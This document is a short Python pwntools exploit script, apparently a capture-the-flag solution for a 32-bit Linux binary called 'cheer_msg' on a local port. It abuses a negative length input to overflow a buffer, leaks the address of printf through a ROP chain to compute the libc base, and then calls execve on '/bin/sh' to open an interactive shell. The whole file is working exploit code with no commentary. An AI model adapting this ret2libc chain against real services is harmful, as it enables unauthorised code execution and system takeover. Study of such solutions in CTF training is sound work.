# -*- coding:utf-8 -*-
from pwn import *

context(os='linux', arch='i386')
conn = remote("localhost", 30527)

prob = ELF('./cheer_msg')
libc = ELF('/lib32/libc.so.6')

conn.recvuntil('Message Length >> ')
conn.sendline('-144')
conn.recvuntil('Name >> ')

plt_printf = prob.plt['printf']
got_printf = prob.got['printf']
addr_main = prob.symbols['main']
buf = pack(plt_printf) + pack(addr_main) + pack(got_printf)
conn.sendline(buf)
conn.recvuntil('Message : \n')
libc_printf = unpack(conn.read(4))

offset_printf = libc.symbols['printf']
offset_execve = libc.symbols['execve']
offset_binsh = next(libc.search('/bin/sh'))
libc_base = libc_printf - offset_printf
libc_execve = libc_base + offset_execve
libc_binsh = libc_base + offset_binsh

conn.recvuntil('Message Length >> ')
conn.sendline('-144')
conn.recvuntil('Name >> ')
buf = pack(libc_execve) + pack(0xdeadbeef) + pack(libc_binsh) + pack(0) + pack(0)
conn.sendline(buf)

conn.interactive()

